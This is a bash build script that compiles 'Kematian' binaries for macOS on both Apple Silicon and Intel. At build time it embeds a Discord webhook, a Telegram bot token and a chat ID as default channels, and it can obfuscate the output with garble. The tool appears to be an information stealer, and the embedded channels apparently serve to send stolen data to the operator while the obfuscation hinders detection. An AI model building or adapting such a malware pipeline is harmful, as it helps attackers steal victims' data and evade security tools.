#!/usr/bin/env bash
# Build standalone Kematian macOS binaries (CGO required). Run on macOS only.
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
OUT_DIR="${ROOT}/dist"
mkdir -p "${OUT_DIR}"

LDFLAGS="-s -w"
if [[ -n "${DISCORD_WEBHOOK:-}" ]]; then
  LDFLAGS="${LDFLAGS} -X 'main.defaultWebhook=${DISCORD_WEBHOOK}'"
fi
if [[ -n "${TELEGRAM_BOT_TOKEN:-}" ]]; then
  LDFLAGS="${LDFLAGS} -X 'main.defaultTelegramBotToken=${TELEGRAM_BOT_TOKEN}'"
fi
if [[ -n "${TELEGRAM_CHAT_ID:-}" ]]; then
  LDFLAGS="${LDFLAGS} -X 'main.defaultTelegramChatID=${TELEGRAM_CHAT_ID}'"
fi
BUILD_CMD=(go build -ldflags="${LDFLAGS}")

if [[ "${OBFUSCATE:-false}" == "true" ]]; then
  if ! command -v garble >/dev/null 2>&1; then
    echo "garble not found. Install with: go install mvdan.cc/garble@latest" >&2
    exit 1
  fi
  if [[ -n "${GARBLE_FLAGS:-}" ]]; then
    echo "Obfuscation enabled (garble ${GARBLE_FLAGS})"
    # shellcheck disable=SC2086
    BUILD_CMD=(garble ${GARBLE_FLAGS} build -ldflags="${LDFLAGS}")
  else
    echo "Obfuscation enabled (garble default)"
    BUILD_CMD=(garble build -ldflags="${LDFLAGS}")
  fi
fi

pushd "${ROOT}" >/dev/null
export CGO_ENABLED=1
export GOOS=darwin

for arch in arm64 amd64; do
  if [[ "${arch}" == "arm64" ]]; then
    export CC="clang -arch arm64"
  else
    export CC="clang -arch x86_64"
  fi
  echo "== Building kematian darwin/${arch} (CGO) =="
  GOARCH="${arch}" "${BUILD_CMD[@]}" \
    -o "${OUT_DIR}/kematian-darwin-${arch}" ./cmd/kematian
done

popd >/dev/null
echo "Done: ${OUT_DIR}/kematian-darwin-{arm64,amd64}"